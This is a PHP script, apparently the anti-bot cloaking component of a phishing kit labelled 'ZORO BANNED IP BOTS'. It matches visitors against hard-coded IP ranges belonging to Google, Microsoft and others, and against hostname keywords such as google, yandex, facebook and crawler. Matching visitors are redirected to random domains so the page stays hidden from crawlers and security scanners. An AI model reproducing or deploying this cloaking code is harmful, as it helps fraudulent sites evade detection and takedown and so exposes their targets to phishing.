<?php	

	/* ───── ❝ ✎ 𝙕𝙊𝙍𝙊™ BANNED IP BOTS ッ ❞ ────── */
		
		$bannedIP = array("63.0.3239.132", "64.0.3282.140", "64.0.3282.167", "66.0.3358.0", "66.0.3359.0", "67.0.3360.0", "67.0.3361.0", "75.163.12.85", "76.19.184.88", "77.69.251.230", "80.104.176.17", "81.0.48.*", "81.0.48.138", "84.13.191.239", "84.92.148.184", "88.99.62.141", "217.96.197.246", "89.234.157.254", "91.231.212.111", "97.85.126.186", "^104.108.64.175", "^134.170.2.199", "82.102.27.77", "^173.194.112.*", "^173.194.116.102", "^173.194.116.149", "^185.28.20.*", "^193.221.113.53", "^199.30.228.*", "^207.46.8.167", "^207.46.8.199", "^208.76.45.53", "^208.84.*.*", "^216.33.229.163", "^216.58.211.37", "^217.16.26.*", "^37.128.131.171", "^54.228.218.*", "^64.233.*.*", "^64.233.173.*", "^64.68.90.*", "^65.54.188.110", "^65.54.188.126", "^65.54.188.94", "^65.55.206.154", "^65.55.33.119", "^65.55.33.135", "^65.55.37.104", "^65.55.37.120", "^65.55.37.72");
			if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)){ header('Location: http://www.' . base64_encode(rand(1,999999999)) . '.com');exit(); }else {foreach($bannedIP as $ip) { if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){header('Location: http://www.' . base64_encode(rand(1,999999999)) . '.com');exit(); } } }
	
		$hostname = gethostbyaddr($_SERVER["REMOTE_ADDR"]);
		$blocked_words = array("webwatch", "webzinger", "whizbang", "whowhere", "wildferret", "worldlight", "wwwc", "wwwster", "xenu", "xget", "xift", "xirq", "yandex", "yanga", "yeti", "yodao", "zao/", "zippp", "zyborg", "facebook", "crawler", "above", "google", "dieblindekuh", "shai", "hulud", "yahoo!", "hotmail",);
			foreach($blocked_words as $word) {if (substr_count($hostname, $word) > 0) {header('Location: http://www.' . base64_encode(rand(1,999999999)) . '.com');exit();}}
	
?>